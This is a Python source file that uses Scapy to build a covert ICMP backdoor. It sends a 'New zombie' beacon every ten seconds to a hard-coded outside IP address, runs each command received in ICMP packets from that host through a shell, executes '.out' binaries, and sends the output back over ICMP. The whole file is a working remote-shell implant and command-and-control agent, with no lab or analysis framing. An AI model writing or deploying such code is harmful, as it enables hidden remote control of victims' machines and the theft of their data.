from scapy.all import *
import threading

server_ip = "16.171.34.132"

def send_icmp_request(dest_ip, message):
    if isinstance(message, str):
        message = message.encode()
    pkt = IP(dst=dest_ip) / ICMP() / message
    send(pkt)
    print(f"Sent ICMP request to {dest_ip} with message: {message.decode(errors='ignore')}")


def run_command(pkt):
    try:
        cmd = pkt[Raw].load.decode().strip()
        print(f"Received command: {cmd}")

        if not cmd or cmd.startswith("New"):
            print(f"Ignoring command: {cmd}")
            return

        if cmd.endswith(".out"):
            print(f"Executing executable file: {cmd}")
            try:
                cmd_output = subprocess.check_output(f"./{cmd}", stderr=subprocess.STDOUT, shell=True)
                print(f"Executable executed successfully. Output: {cmd_output.decode(errors='ignore')}")
                send_icmp_request(server_ip, "Script executed!")
                return
            except subprocess.CalledProcessError as e:
                error_msg = f"Error executing file: {str(e)}. Output: {e.output.decode(errors='ignore')}"
                print(f"[ERROR] {error_msg}")
                send_icmp_request(server_ip, error_msg)
                return

        print(f"Executing command: {cmd}")
        cmd_output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
        send_icmp_request(server_ip, f"Output: {cmd_output.decode(errors='ignore')}")

    except Exception as ex:
        error_msg = f"Failed to execute command: {str(ex)}"
        print(f"[ERROR] {error_msg}")
        send_icmp_request(server_ip, error_msg)

def start_sniffing():
    sniff(filter=f"icmp and src {server_ip}", prn=run_command)


if __name__ == '__main__':
    sniff_thread = threading.Thread(target=start_sniffing)
    sniff_thread.daemon = True
    sniff_thread.start()

    while True:
        send_icmp_request(server_ip, "New zombie")
        time.sleep(10)
